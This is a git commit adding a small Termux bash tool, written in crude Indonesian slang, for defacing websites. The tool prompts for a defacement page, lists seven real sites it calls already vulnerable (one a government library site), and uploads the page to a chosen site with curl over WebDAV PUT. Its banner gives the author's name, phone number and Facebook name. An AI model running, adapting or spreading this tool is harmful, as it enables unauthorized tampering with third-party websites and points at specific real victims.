636713c6e273de78917edb11e6ae34aa9f622869
K4ngR3c0d3 <57221701+K4ngR3c0d3@users.noreply.github.com>
2020-01-13 20:44:22 +0700

    Add files via upload

---
+++ webdav2.sh
@@ -0,0 +1,43 @@
+#sh/bash
+#webdav2
+
+clear
+figlet webdav v2
+echo "==============="
+echo "@uthor:Master_Z"
+echo "tools:webdav v2"
+echo "team:Light Cyber Indonesia"
+echo "pesan:recode kencing nanah"
+echo "whatsapp:081413072034"
+echo "FB:Moch Zaeni Sahrudin ID"
+echo "==============="
+echo ""
+echo "script deface harus di luar folder njenkkk"
+read -p "Masukan Nama script deface: " script;
+read -p "PILIH WEB UNTUK DI TUSBOL/EUE: "
+echo "http://ayk.co.za"
+echo "http://floralandfresh.co.za"
+echo "http://allpaint.co.za"
+echo "http://8x8.co.za"
+echo "http://mpark.co.za"
+echo "http://inlislitev3.perpusnas.go.id"
+echo "http://entitledvip.com"
+echo "=========================="
+echo "WEB DI ATAS SUDAH VULN KALO MAU CARI YANG LAIN GAK PAPA NJENGG"
+read -p "MASUKIN WEB UNTUK DI EUE:" web;
+sleep 4
+echo "proses njengg....."
+sleep 2
+termux-setup-storage
+curl -T /storage/emulated/0/$script $web
+echo "Succes"
+echo "silahkan tambahkan nama sc deface lo di belakang web"
+echo "contoh site.co.li/namasclo"
+echo "Jangan SALAH GUNAKAN TOOLS INI:V"
+echo "recode kencing nanah"
+echo "hasil lo kalo lo males tinggal salin"
+echo "TINGGAL COPY NJENKKK"
+echo ""
+echo "$web/$script"
+echo ""
+echo "kalo tools ini rusak silahkeun hubungi Master_Z"
